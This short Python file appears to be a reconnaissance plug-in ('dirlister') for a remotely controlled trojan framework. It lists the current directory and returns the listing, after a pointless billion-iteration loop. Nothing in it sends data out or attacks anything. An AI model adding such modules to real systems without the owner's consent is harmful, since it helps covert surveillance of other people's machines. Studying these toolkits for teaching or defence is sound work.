# -*- coding: utf-8 -*-
import os
def run(**args):
    print("[*] In dirlister module.")
    files = os.listdir(".") #возвращает список файлов в папке
    n = 0
    for i in range(0, 1000000000):
        n += i
    print(n)
    return str(files)
